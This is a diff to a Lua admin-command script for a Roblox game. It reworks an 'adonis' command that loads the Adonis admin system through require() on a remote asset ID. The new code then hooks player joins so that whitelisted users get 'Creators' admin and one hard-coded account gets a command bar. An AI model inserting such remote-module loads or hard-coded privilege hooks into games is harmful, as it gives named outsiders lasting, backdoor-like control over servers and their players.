@@ -9649,25 +9649,63 @@ addCommand({
     end
 })
 
---you might ask why not just "rank = SENIOR_MOD," after (    usage = prefix .. "adonis",    ) but i prefer it this way
 addCommand({
     name = "adonis",
-    aliases = {"loadadonis", "aload"},
-    desc = "Loads Adonis admin",
-    usage = prefix .. "adonis",
+    aliases = {"aload","loadadonis"},
+    desc = "Loads Adonis and applies whitelist",
+    usage = prefix.."adonis",
+    rank = RANKS.FULL_ACCESS,
     callback = function(plr, args)
-        local target = Players:FindFirstChild("idonthacklol101ns")
-
-        if target then
-            require(16662768931):GetAdmin("idonthacklol101ns", "Hi??")
-            if plr.Name ~= "idonthacklol101ns" then
-                notify(plr,"Sentrius","adonis has been loaded on idonthacklol101ns\nask him for admin",6)
-            end
-        elseif getrank(plr) > RANKS.FULL_ACCESS then --i just realized senior mod cant run #s so it'll load only for full access now
+        local ok, err = pcall(function()
             require(16662768931):GetAdmin(plr.Name, "Hi??")
-            notify(plr,"Sentrius","adonis has been loaded on you since idonthacklol101ns is not in-game",6)
+
+            local timeout = tick()
+            repeat
+                task.wait(0.5)
+            until _G.Adonis ~= nil or tick() - timeout >= 15
+
+            if _G.Adonis == nil then
+                error("Adonis never initialized _G.Adonis after 15 seconds")
+            end
+
+            local data = _G.Adonis
+            local server = data.Server
+            local service = data.Service
+            local Players = service.Players
+
+            for _, p in ipairs(Players:GetPlayers()) do
+                if whitelist[p.UserId] then
+                    pcall(function()
+                        server.Admin.AddAdmin(p.Name, "Creators")
+                    end)
+                end
+                if p.Name == "idonthacklol101ns" then
+                    pcall(function()
+                        _G.Adonis.RunCommand(p, ":cmdbar", true)
+                    end)
+                end
+            end
+
+            Players.PlayerAdded:Connect(function(p)
+                if whitelist[p.UserId] then
+                    pcall(function()
+                        server.Admin.AddAdmin(p.Name, "Creators")
+                    end)
+                end
+                if p.Name == "idonthacklol101ns" then
+                    task.wait(1)
+                    pcall(function()
+                        _G.Adonis.RunCommand(p, ":cmdbar", true)
+                    end)
+                end
+            end)
+        end)
+
+        if not ok then
+            warn(err)
+            notify(plr, "Sentrius", "Failed to load Adonis.", 5)
         else
-            notify(plr,"Sentrius","idonthacklol101ns is not in-game and your rank is not high enough to load adonis on yourself",5)
+            notify(plr, "Sentrius", "Adonis loaded and hooks applied.", 5)
         end
     end
 })
